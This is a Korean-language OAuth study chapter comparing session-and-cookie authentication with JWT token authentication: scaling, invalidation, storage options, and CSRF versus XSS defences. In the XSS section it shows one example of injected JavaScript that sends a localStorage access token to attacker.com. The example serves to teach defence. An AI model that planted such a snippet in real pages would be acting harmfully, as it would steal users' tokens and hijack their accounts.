---
title: "세션·쿠키 vs 토큰"
description: "서버 세션 기반 인증과 토큰 기반 인증의 차이를 상태 관리 관점에서 비교한다."
date: 2026-04-17
tags: [세션, 쿠키, 토큰, 상태관리]
prev: /study/oauth/01-password-sharing-era
next: /study/oauth/03-authn-vs-authz
---

# 세션·쿠키 vs 토큰

::: info 학습 목표
- 세션·쿠키 플로우와 토큰 플로우가 어떻게 다른지 시퀀스 단위로 설명할 수 있다.
- stateful과 stateless의 트레이드오프를 서버 확장성·무효화·저장소 관점에서 안다.
- 각 방식의 보안 이슈(CSRF vs XSS, HttpOnly vs localStorage)를 비교할 수 있다.
- OAuth가 왜 토큰 방식을 선택했는지 그 배경을 이해한다.
:::

---

## 1. 세션·쿠키 방식의 동작

세션 기반 인증은 웹 초기부터 쓰여 온 고전적 방식이다. 핵심은 "서버가 로그인 상태를 기억한다"는 점이다. 서버는 로그인한 사용자마다 <strong>세션</strong>이라는 상태 객체를 만들고, 클라이언트에게는 그 세션을 가리키는 식별자만 쿠키로 건넨다.

### 기본 플로우

```mermaid
sequenceDiagram
    participant B as 브라우저
    participant S as 서버
    participant ST as 세션 저장소
    B->>S: POST /login (id, pw)
    S->>S: 비밀번호 검증
    S->>ST: 세션 생성 (SESSIONID=abc123 → user=42)
    S-->>B: Set-Cookie: SESSIONID=abc123; HttpOnly; Secure
    Note over B: 이후 모든 요청에 쿠키 자동 포함
    B->>S: GET /me (Cookie: SESSIONID=abc123)
    S->>ST: SESSIONID=abc123 조회
    ST-->>S: user=42
    S-->>B: 200 OK (user 정보)
```

### 핵심 구성 요소

- <strong>세션 저장소</strong>: 서버(또는 외부 Redis/DB)에 세션 객체를 유지한다. 키는 `SESSIONID`, 값은 `user_id`, `role`, `expires_at` 등이다.
- <strong>쿠키</strong>: 브라우저가 자동으로 관리하는 저장소. 같은 도메인으로 가는 모든 요청에 자동 첨부된다. `HttpOnly` 속성을 주면 JavaScript로 읽을 수 없다.
- <strong>서버 검증</strong>: 매 요청마다 서버는 쿠키에 담긴 `SESSIONID`로 세션 저장소를 조회해 사용자를 식별한다.

### 로그아웃의 단순함

세션 방식에서 로그아웃은 간단하다. 세션 저장소에서 해당 `SESSIONID` 레코드를 삭제하면 끝이다. 이후 그 쿠키를 가진 요청이 와도 서버는 "모르는 세션"이라고 거부한다.

```java
@PostMapping("/logout")
public void logout(HttpSession session) {
    session.invalidate(); // 서버 측 세션 제거
}
```

---

## 2. 토큰 방식의 동작

토큰 방식은 "서버가 상태를 기억하지 않는다"는 철학에서 출발한다. 서버는 로그인 성공 시 <strong>서명된 토큰</strong>을 만들어 클라이언트에게 건네고, 그 이후로는 아무것도 기억하지 않는다. 클라이언트가 매 요청마다 토큰을 첨부하면, 서버는 서명만 검증해서 사용자를 식별한다.

### 기본 플로우

```mermaid
sequenceDiagram
    participant C as 클라이언트
    participant S as 서버
    C->>S: POST /login (id, pw)
    S->>S: 비밀번호 검증
    S->>S: JWT 생성 (user=42, exp=...)
    S->>S: 비밀키로 서명
    S-->>C: { "access_token": "eyJhbGc..." }
    Note over C: localStorage 또는 메모리에 저장
    C->>S: GET /me (Authorization: Bearer eyJhbGc...)
    S->>S: 토큰 서명 검증 (서버 조회 없음)
    S->>S: payload에서 user=42 추출
    S-->>C: 200 OK
```

### JWT 토큰의 구조

JWT(JSON Web Token)는 대표적인 자가 기술(self-contained) 토큰 포맷이다. 세 부분으로 구성된다.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsImV4cCI6MTcxNTAwMDAwMH0.abc123signature
│────── Header ──────│─────────── Payload ───────────│── Signature ──│
```

| 부분 | 내용 | 예시 |
|----|-----|------|
| Header | 알고리즘·토큰 타입 | `{"alg":"HS256","typ":"JWT"}` |
| Payload | 클레임(사용자 식별, 만료, 권한 등) | `{"sub":"42","exp":1715000000}` |
| Signature | Header+Payload를 비밀키로 서명 | HMAC-SHA256 결과 |

서명이 있기 때문에, 서버는 토큰을 "조회"하지 않고 "검증"만 하면 된다. 서명이 유효하면 페이로드의 내용을 신뢰할 수 있다.

### 토큰 저장 위치

| 저장소 | 장점 | 단점 |
|------|-----|------|
| localStorage | JS로 접근 편리, SPA 친화적 | XSS에 취약 (JS로 읽힘) |
| sessionStorage | 탭 종료 시 소멸 | XSS에 취약, 탭 간 공유 불가 |
| 메모리(변수) | 가장 안전 | 새로고침 시 소멸 |
| 쿠키(HttpOnly) | JS 접근 불가로 XSS 안전 | CSRF 대책 필요 |

실무에서는 단일 저장소에 의존하지 않고 Access Token은 메모리, Refresh Token은 HttpOnly 쿠키로 분리하는 식의 조합이 많이 쓰인다. 자세한 내용은 CH14에서 다룬다.

---

## 3. Stateful vs Stateless

두 방식의 가장 근본적인 차이는 <strong>서버가 상태를 기억하는가</strong>이다. 이 하나의 축에서 확장성·배포·무효화 난이도가 모두 갈린다.

### 서버 확장 시나리오

세션 방식에서 서버를 2대 이상으로 확장하면, 각 서버가 갖는 세션 저장소가 분리되어 문제가 생긴다.

```mermaid
flowchart LR
    LB[로드 밸런서] --> S1[서버 A<br>세션 저장소 A]
    LB --> S2[서버 B<br>세션 저장소 B]
    C[클라이언트<br>SESSIONID=abc] -.첫 요청.-> S1
    C -.두 번째 요청.-> S2
    S2 -.모르는 세션.-x C
    style S2 fill:#fdd
```

이를 해결하는 방식은 세 가지다.

- <strong>Sticky Session</strong>: 로드 밸런서가 같은 클라이언트를 항상 같은 서버로 보낸다. 서버 장애 시 세션이 통째로 날아간다.
- <strong>Session Clustering</strong>: 서버끼리 세션을 복제한다. 메모리 사용량과 네트워크 부하가 크다.
- <strong>외부 세션 저장소</strong>: Redis 같은 공유 저장소를 둔다. 가장 일반적이지만 추가 인프라가 필요하고 조회 비용이 매 요청마다 발생한다.

토큰 방식은 이 고민이 없다. 토큰 자체가 상태를 담고 있으므로, 어느 서버로 가도 서명만 검증하면 된다. 서버를 무한히 수평 확장해도 세션 동기화 문제가 생기지 않는다.

```mermaid
flowchart LR
    LB[로드 밸런서] --> S1[서버 A]
    LB --> S2[서버 B]
    LB --> S3[서버 C]
    S1 -.- K[(공용 비밀키<br>또는 JWKS)]
    S2 -.- K
    S3 -.- K
    C[클라이언트<br>Bearer eyJ...] --> LB
    style S1 fill:#efe
    style S2 fill:#efe
    style S3 fill:#efe
```

### 무효화(Invalidation) 문제

반대로, 토큰 방식은 <strong>즉시 무효화</strong>가 어렵다. 서버가 상태를 기억하지 않으므로, "이 토큰은 이제 무효야"라고 선언할 곳이 없다. 토큰은 발급 시 포함된 만료 시각(`exp`)이 올 때까지 유효하다.

이를 보완하기 위해 여러 전략이 쓰인다.

- <strong>짧은 만료 시간</strong>: Access Token은 5~60분 정도로 짧게 설정한다.
- <strong>Refresh Token</strong>: 장기 자격을 별도로 두고, Access Token을 주기적으로 갱신한다.
- <strong>블랙리스트</strong>: 탈취 사실이 알려진 토큰을 서버(또는 Redis)에 저장해서 검증 시 거부한다. stateless의 장점을 일부 희생한다.
- <strong>Introspection 엔드포인트</strong>: AS가 토큰의 유효성을 실시간 응답한다(RFC 7662). 세션 방식과 비슷한 비용이 생긴다.

### Stateful vs Stateless 비교표

| 관점 | 세션(Stateful) | 토큰(Stateless) |
|----|------|--------|
| 서버 상태 | 저장소에 세션 유지 | 없음 |
| 확장성 | 공유 저장소 필요 | 비밀키만 공유하면 됨 |
| 검증 비용 | 매 요청마다 저장소 조회 | 서명 검증만 (CPU 비용) |
| 즉시 무효화 | 쉬움 (레코드 삭제) | 어려움 (블랙리스트 필요) |
| 저장소 부하 | 세션 수에 비례 | 없음 |
| 토큰 크기 | 세션 ID만(짧음) | 페이로드 포함(김) |
| 모바일·SPA | 쿠키 제한 있음 | 자유로움 |
| 다중 디바이스 | 세션별 추적 쉬움 | 별도 관리 필요 |

---

## 4. 보안 면 비교

각 방식이 마주치는 공격 벡터가 다르다. "어느 쪽이 더 안전한가"가 아니라 "어떤 공격에 대비해야 하는가"가 정확한 질문이다.

### 세션·쿠키의 주요 위협 — CSRF

CSRF(Cross-Site Request Forgery)는 피해자 브라우저가 이미 로그인되어 있는 상태에서, 공격자가 유도한 요청에 브라우저가 쿠키를 자동으로 붙여 보내게 하는 공격이다.

```mermaid
sequenceDiagram
    participant V as 피해자 브라우저
    participant B as 은행 서버
    participant A as 공격자 사이트
    V->>B: 정상 로그인 (SESSIONID 쿠키 수신)
    V->>A: 공격자 사이트 방문
    A->>V: img src=bank.com/transfer?to=attacker 삽입
    V->>B: GET /transfer?to=attacker (쿠키 자동 첨부)
    B->>B: 세션 유효 → 이체 처리
    B-->>V: 200 OK
    Note over V,B: 피해자는 아무것도 하지 않았지만 이체됨
```

<strong>방어책</strong>

- `SameSite=Lax` 또는 `Strict` 쿠키 속성 (최신 브라우저 기본값 Lax)
- CSRF Token (폼이나 헤더에 랜덤 값 포함, 서버가 세션과 비교)
- `Origin`·`Referer` 헤더 검증

### 토큰의 주요 위협 — XSS

토큰이 `localStorage`에 있다면, 페이지에 XSS(Cross-Site Scripting)가 주입되는 순간 공격자 스크립트가 토큰을 <strong>그대로 읽어서</strong> 서버로 전송할 수 있다.

```javascript
// 공격자 주입 코드
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('access_token')
});
```

토큰이 탈취되면 공격자는 그 토큰으로 API를 호출할 수 있고, 서버는 정상 요청과 구분할 방법이 없다.

<strong>방어책</strong>

- XSS 자체를 막기 (출력 이스케이프, CSP, 입력 검증)
- Access Token을 메모리에만 보관, Refresh Token은 HttpOnly 쿠키
- 짧은 만료 시간
- 토큰에 사용 컨텍스트 바인딩 (DPoP, mTLS — CH13에서 다룬다)

### HttpOnly vs JavaScript 접근

| 저장 방식 | JS 접근 | XSS 위험 | CSRF 위험 |
|---------|--------|---------|----------|
| localStorage | 가능 | 높음 | 낮음(자동 첨부 아님) |
| HttpOnly 쿠키 | 불가 | 낮음 | 높음(대책 필요) |

즉 <strong>세션·쿠키 = CSRF 대책 필수</strong>, <strong>localStorage 토큰 = XSS 대책 필수</strong>로 위협이 다르게 배분된다.

### 무효화 난이도

세션은 저장소 레코드를 지우면 즉시 끝난다. 토큰은 "만료될 때까지" 유효하므로, 탈취가 확인되어도 그 시점부터 만료까지의 윈도우 동안 공격자가 자유롭게 API를 호출할 수 있다. 이 때문에 Access Token의 수명은 짧게(5~15분이 일반적) 가져가는 것이 중요하다.

---

## 5. 왜 OAuth는 토큰인가

OAuth는 본질적으로 "사용자가 제3자 앱에게 자신의 자원 접근을 위임"하는 문제를 푼다. 이 시나리오를 세션·쿠키로 풀려고 하면 근본적 충돌이 생긴다.

### 제3자 API 호출의 요구

- <strong>도메인 간 호출</strong>: 클라이언트 앱(A.com)이 자원 서버(B.com)에 요청을 보낸다. 쿠키는 기본적으로 같은 도메인에만 첨부된다.
- <strong>서버 간 호출</strong>: 모바일 앱이나 M2M(Machine-to-Machine) 시나리오에서는 브라우저 쿠키 모델이 적용되지 않는다.
- <strong>자원 서버 분리</strong>: AS(인가 서버)와 RS(자원 서버)가 다른 조직에 있을 수도 있다. 이들이 세션을 공유하는 것은 비현실적이다.

### 다중 클라이언트 유형 지원

OAuth는 웹 앱뿐 아니라 모바일, SPA, IoT, CLI, 서버 데몬까지 모두 지원해야 한다. 이 중 상당수는 쿠키 저장소 자체가 없거나, 있더라도 모델이 다르다. 토큰은 이런 환경에서 일관된 인터페이스로 동작한다.

### 표준화된 전달 메커니즘

HTTP 표준은 토큰을 싣는 방법을 이미 정의해 두고 있다.

```http
GET /v1/me/contacts HTTP/1.1
Host: api.google.com
Authorization: Bearer ya29.a0AfB_abc...
```

클라이언트 유형에 관계없이 `Authorization` 헤더 하나로 통한다. 서버는 토큰을 <strong>불투명(opaque)</strong>으로 취급할 수도, <strong>자가 기술(JWT)</strong>로 해석할 수도 있다. 이 유연성은 세션 쿠키 모델로는 얻기 어렵다.

### OAuth 선택의 결과

```mermaid
flowchart TD
    R[요구사항] --> R1[도메인 간 호출]
    R --> R2[브라우저 외 클라이언트]
    R --> R3[AS와 RS 분리]
    R --> R4[세분화된 권한 위임]
    R1 --> T[토큰 모델]
    R2 --> T
    R3 --> T
    R4 --> T
    T --> B[Bearer Token in<br>Authorization 헤더]
    style T fill:#efe
    style B fill:#efe
```

OAuth가 "토큰"을 선택한 이유는 이념적이지 않다. <strong>요구되는 시나리오들이 토큰 모델 말고는 깔끔하게 풀리지 않았기</strong> 때문이다. 동시에 OAuth는 세션 방식의 장점(즉시 무효화)을 버리지 않기 위해 Refresh Token·Introspection·Revocation 같은 보완 장치를 추가로 설계했다. 이 장치들은 CH8에서 자세히 다룬다.

---

::: tip 핵심 정리
- 세션·쿠키 방식은 서버가 세션 상태를 저장소에 유지하고, 쿠키는 그 식별자만 전달한다. 무효화는 쉽지만 서버 확장 시 공유 저장소가 필요하다.
- 토큰 방식은 서버가 상태를 갖지 않고, 서명된 토큰을 매 요청마다 검증한다. 수평 확장에 유리하지만 즉시 무효화가 어렵고 보완 장치가 필요하다.
- 세션은 CSRF가, 토큰은 XSS가 주요 위협이다. HttpOnly 쿠키는 XSS를 막고, SameSite와 CSRF 토큰은 CSRF를 막는다.
- OAuth는 도메인 간 호출·다중 클라이언트·AS와 RS 분리 시나리오를 지원하기 위해 토큰을 채택했고, 무효화 약점은 Refresh Token·Introspection·Revocation으로 보완했다.
:::

## 다음 챕터

- 이전 : [비밀번호를 공유하던 시절](/study/oauth/01-password-sharing-era)
- 다음 : [인증과 인가는 어떻게 다른가](/study/oauth/03-authn-vs-authz)
